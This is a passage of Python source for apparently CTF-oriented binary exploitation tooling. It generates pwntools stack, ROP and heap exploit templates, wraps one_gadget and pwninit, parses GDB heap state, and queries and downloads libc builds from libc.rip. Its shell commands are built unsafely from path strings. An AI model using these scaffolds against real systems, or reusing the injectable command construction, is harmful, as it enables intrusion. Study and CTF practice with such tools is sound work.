                abs_addr = libc_base + off
                rest = ' '.join(line.split()[1:])
                print(f'{{hex(abs_addr)}} (offset {{hex(off)}}) {{rest}}')
    else:
        print('one_gadget not installed. Install: gem install one_gadget')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "check_constraints":
        if not sp: return "Provide libc_path="
        cs = constraints or {}
        out = _shell(f"one_gadget '{sp}' --constraints '{' '.join(f'{k}=={v}' for k,v in cs.items())}' 2>&1", timeout=20)
        return out

    return "Operations: find, best, find_with_leak, check_constraints"


def tool_pwn_template(binary_path: str = "", host: str = "", port: int = 0,
                      operation: str = "generate", vuln_type: str = "auto",
                      libc_path: str = "") -> str:
    """Exploit template generator wrapping pwninit + pwntools.
    Ops: generate (full exploit template from binary analysis),
    stack_template (ret2win/rop scaffold), heap_template (heap exploit scaffold),
    rop_template (full ROP chain with libc leak scaffold),
    pwninit (run pwninit to patch binary + generate template file)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation == "pwninit":
        if not sp: return "Provide binary_path="
        result = _shell(f"cd '{os.path.dirname(sp)}' && pwninit --binary '{sp}'" +
                       (f" --libc '{lp}'" if lp else "") + " 2>&1", timeout=30)
        if "not found" in result:
            return "pwninit not installed. Install: cargo install pwninit\nOr: https://github.com/io12/pwninit"
        return result

    if operation in ("generate", "stack_template", "heap_template", "rop_template"):
        # Get checksec info to inform template
        checksec = _shell(f"checksec --file='{sp}' 2>/dev/null || checksec '{sp}' 2>/dev/null", timeout=10) if sp else ""
        arch = "amd64"
        if sp:
            file_out = _shell(f"file '{sp}'", timeout=5)
            if "32-bit" in file_out or "i386" in file_out: arch = "i386"
            if "aarch64" in file_out: arch = "aarch64"

        host_line = f"HOST, PORT = {repr(host)}, {port}" if host and port else "HOST, PORT = 'challenge.ctf.com', 1337"
        conn_line = "io = remote(HOST, PORT)" if host and port else f"io = process({repr(sp) if sp else repr('./vuln')})"
        libc_line = f"libc = ELF({repr(lp)}, checksec=False)" if lp else "# libc = ELF('./libc.so.6', checksec=False)"

        if vuln_type == "auto":
            if "stack" in operation or checksec:
                vuln_type = "heap" if "heap" in operation else "stack"

        if vuln_type == "heap" or operation == "heap_template":
            template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF({repr(sp) if sp else repr('./vuln')}, checksec=False)
context.arch = {repr(arch)}
{libc_line}

{host_line}

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

gs = """
set context-output /dev/null
heap
bins
"""

def alloc(size, data=b"A"):
    io.sendlineafter(b"choice", b"1")
    io.sendlineafter(b"size", str(size).encode())
    io.sendlineafter(b"data", data)

def free(idx):
    io.sendlineafter(b"choice", b"2")
    io.sendlineafter(b"index", str(idx).encode())

def show(idx):
    io.sendlineafter(b"choice", b"3")
    io.sendlineafter(b"index", str(idx).encode())
    return io.recvline()

io = start()
if args.GDB:
    gdb.attach(io, gs)

# === EXPLOIT HERE ===
# Step 1: Leak heap/libc address
# Step 2: Poison tcache/fastbin
# Step 3: Allocate to target (e.g. __free_hook, __malloc_hook)
# Step 4: Write shellcode or system address

io.interactive()
'''
        else:  # stack / rop
            template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF({repr(sp) if sp else repr('./vuln')}, checksec=False)
context.arch = {repr(arch)}
{libc_line}

{host_line}

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = start()

# === OFFSET ===
# Find with: cyclic(200), examine crash EIP/RIP
# or: tool_binary_analysis(path, "pwndbg_cyclic", "200")
OFFSET = 0  # <-- fill in

# === LEAK (if PIE/ASLR) ===
# leak = u64(io.recvuntil(b"\\n")[:-1].ljust(8, b"\\x00"))
# elf.address = leak - elf.symbols["main"]

# === LIBC LEAK (if needed) ===
# Send ROP to print GOT entry, recv leak, calculate base
# libc.address = leaked_puts - libc.symbols["puts"]
# one_gadget = libc.address + 0xXXXXX  # from tool_one_gadget

# === PAYLOAD ===
payload = flat({{
    OFFSET: [
        # rop gadgets here
    ]
}})

io.sendlineafter(b"input", payload)
io.interactive()
'''

        log("sys", f"[pwn_template] Generated {arch} {vuln_type} template ({len(template)} chars)", "dim")
        return template

    return "Operations: generate, stack_template, heap_template, rop_template, pwninit"


def tool_heap_visualize(operation: str = "parse_state", gdb_output: str = "",
                        binary_path: str = "", pid: int = 0) -> str:
    """Parse and visualize pwndbg/GDB heap state.
    Ops: parse_state (parse raw pwndbg 'heap'/'bins'/'vis_heap_chunks' output into structured data),
    live (attach to running process and dump heap via pwndbg),
    find_overlap (check if two chunks overlap — common in heap overflow challenges),
    tcache_status (parse tcache bins and counts),
    check_double_free (scan for same chunk address in multiple bins)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    if operation == "live":
        target = f"--pid {pid}" if pid else (f"'{sp}'" if sp else "")
        if not target: return "Provide binary_path= or pid="
        script = "set pagination off\nheap\nbins\nvis_heap_chunks\ntcachebins\nquit"
        tmp = f"/tmp/heap_viz_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(script)
        out = _shell(f"gdb -batch -x '{tmp}' {target} 2>&1", timeout=30)
        try: os.remove(tmp)
        except: pass
        return out

    if operation in ("parse_state", "find_overlap", "tcache_status", "check_double_free"):
        text = gdb_output or ""
        if not text and sp:
            # Run live
            script = "set pagination off\nheap\nbins\ntcachebins\nvis_heap_chunks 20\nquit"
            tmp = f"/tmp/heap_gdb_{int(time.time())}.gdb"
            with open(tmp, "w") as f: f.write(script)
            text = _shell(f"gdb -batch -x '{tmp}' '{sp}' 2>&1", timeout=30)
            try: os.remove(tmp)
            except: pass

        code = f"""
import re
text = {repr(text[:8000])}

# Parse chunk addresses from vis_heap_chunks
chunks = re.findall(r'0x[0-9a-f]{{8,16}}', text)
unique_chunks = list(dict.fromkeys(chunks))

# Look for tcache/fastbin entries
tcache = re.findall(r'tcachebins.*?(?=fastbins|$)', text, re.DOTALL)
fastbin = re.findall(r'fastbins.*?(?=smallbins|$)', text, re.DOTALL)

print("=== Heap Summary ===")
print(f"Addresses found: {{len(unique_chunks)}}")
print("First 10:", unique_chunks[:10])

if '{operation}' == 'tcache_status':
    print("\\n=== Tcache Bins ===")
    for line in text.splitlines():
        if 'tcache' in line.lower() or 'count' in line.lower():
            print(line)

if '{operation}' == 'find_overlap':
    print("\\n=== Overlap Check ===")
    # Look for same address in multiple bins
    all_addrs = re.findall(r'(0x[0-9a-f]{{8,16}})', text)
    from collections import Counter
    dupes = {{addr: cnt for addr, cnt in Counter(all_addrs).items() if cnt > 1}}
    if dupes:
        for addr, cnt in dupes.items():
            print(f'  [!] {{addr}} appears {{cnt}} times — possible overlap/double-free')
    else:
        print('  No obvious overlaps detected')

if '{operation}' == 'check_double_free':
    print("\\n=== Double-Free Check ===")
    all_addrs = re.findall(r'(0x[0-9a-f]{{8,16}})', text)
    from collections import Counter
    dupes = {{addr: cnt for addr, cnt in Counter(all_addrs).items() if cnt > 2}}
    for addr, cnt in dupes.items():
        print(f'  [POSSIBLE DOUBLE-FREE] {{addr}} x{{cnt}}')
    if not dupes:
        print('  No double-free detected')

print("\\nRaw output preview:")
print(text[:500])
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: live, parse_state, find_overlap, tcache_status, check_double_free"


def tool_libc_database(operation: str = "search", leak_addr: str = "",
                       symbol: str = "puts", extra_symbols: dict = None,
                       build_id: str = "", arch: str = "amd64") -> str:
    """Extended libc lookup using libc.rip API + pwntools LibcSearcher + local database.
    Ops: search (find libc from leaked address + symbol name via libc.rip),
    identify (narrow down libc with multiple leak+symbol pairs),
    download (download matching libc .so from libc.rip),
    offsets (print all useful symbol offsets for a known libc build),
    one_gadgets (get one_gadget offsets for a libc build)."""

    base_url = "https://libc.rip/api"

    if operation == "search":
        if not leak_addr or not symbol:
            return "Provide leak_addr= (hex) and symbol= (e.g. 'puts')"
        code = f"""
import requests, json
url = 'https://libc.rip/api/find'
# Last 3 nibbles of address are the offset within a page
leak = {int(leak_addr, 16)}
last12 = hex(leak)[-3:]  # last 12 bits
data = {{'symbols': {{'{symbol}': last12}}}}
try:
    r = requests.post(url, json=data, timeout=10)
    results = r.json()
    if not results:
        print('No matching libc found for this leak')
    else:
        print(f'Found {{len(results)}} matching libc build(s):')
        for res in results[:5]:
            print(f"  ID: {{res.get('id','?')}}  symbols: {{list(res.get('symbols',{{}}).keys())[:5]}}")
            # Compute useful offsets
            for sym, off in res.get('symbols',{{}}).items():
                if sym in ('puts','system','__libc_start_main','str_bin_sh','one_gadget'):
                    abs_addr = {int(leak_addr,16)} - int(res['symbols'].get('{symbol}','0'), 16) + int(off, 16)
                    print(f'    {{sym}}: {{hex(int(off,16))}} → {{hex(abs_addr)}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "identify":
        syms = extra_symbols or {}
        if not syms: return "Provide extra_symbols={'puts': '0x...', 'printf': '0x...'}"
        code = f"""
import requests
last12 = {{k: hex(v)[-3:] if isinstance(v,int) else v[-3:] for k,v in {repr(syms)}.items()}}
r = requests.post('https://libc.rip/api/find', json={{'symbols': last12}}, timeout=10)
results = r.json()
if not results:
    print('No match found')
else:
    for res in results[:3]:
        print(f"ID: {{res.get('id')}}  arch: {{res.get('arch')}}  distro: {{res.get('distro')}}")
        for sym, off in res.get('symbols',{{}}).items():
            print(f'  {{sym}}: {{off}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "download":
        if not build_id: return "Provide build_id= from search results"
        out_path = f"/tmp/libc_{build_id}.so"
        result = _shell(f"wget -q 'https://libc.rip/download/{build_id}' -O '{out_path}' && echo 'Downloaded: {out_path}'", timeout=30)
        return result

    if operation == "offsets":
        if not build_id and not leak_addr: return "Provide build_id= or leak_addr+symbol="
        code = f"""
import requests
bid = {repr(build_id)}
r = requests.get(f'https://libc.rip/api/libc/{{bid}}', timeout=10)
data = r.json()
useful = ['puts','gets','system','execve','__libc_start_main','malloc','free',
          'str_bin_sh','__free_hook','__malloc_hook','environ','printf']
print(f"Libc: {{data.get('id')}}  buildid: {{data.get('buildid','?')[:16]}}")
syms = data.get('symbols', {{}})
for sym in useful:
    if sym in syms:
        print(f'  {{sym}}: {{syms[sym]}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "one_gadgets":
        if not build_id: return "Provide build_id= — download libc first then use tool_one_gadget"
        out_path = f"/tmp/libc_{build_id}.so"
        _shell(f"wget -q 'https://libc.rip/download/{build_id}' -O '{out_path}'", timeout=30)
        return tool_one_gadget(out_path, "find")

    return "Operations: search, identify, download, offsets, one_gadgets"


